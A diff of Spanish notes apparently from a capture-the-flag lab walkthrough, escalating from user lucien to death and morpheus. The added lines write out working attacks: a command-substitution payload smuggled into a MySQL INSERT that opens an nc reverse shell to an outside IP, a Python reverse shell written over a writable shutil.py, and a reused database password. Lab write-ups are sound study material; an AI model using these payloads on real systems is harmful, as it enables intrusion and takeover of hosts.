@@ -22,5 +22,24 @@ DB_USER = "death"
 DB_PASS = "#redacted"
 DB_NAME = "library"
 
-- su lucien y cambiamos de user con la pw pillada.-
-- 
+- ssh lucien@10.130.178.56
+- con sudo -l veo que -> User lucien may run the following commands on ip-10-130-178-56: (death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
+- sudo -u death python3 /home/death/getDreams.py -> y se ejecuta el script que vemos:
+
+Alice + Flying in the sky
+
+Bob + Exploring ancient ruins
+
+Carol + Becoming a successful entrepreneur
+
+Dave + Becoming a professional musician
+
+- El script parece una copia segun lo que salga de getDreams.py
+- Vemos que en el historial de cat $HOME/.bash_history hay un comando ->  mysql -u lucien -plucien42DBPASSWORD
+- Vemos la tabla que lee el script y insertamos INSERT INTO dreams (dreamer, dream) VALUES ('s4cript', '$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.132.185 4444 >/tmp/f)'); para que ejecute
+- sudo -u death /usr/bin/python3 /home/death/getDreams.py
+- Conseguimos la shell siendo death y pillamos flag.
+- Le paso linpeas y veo que hay /usr/lib/python3.8/shutil.py writable by death group.
+- echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",9003));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' > /usr/lib/python3.8/shutil.py
+- nc -lvnp 9003
+- y listo cat /home/morpheus/morpheus_flag.txt :)
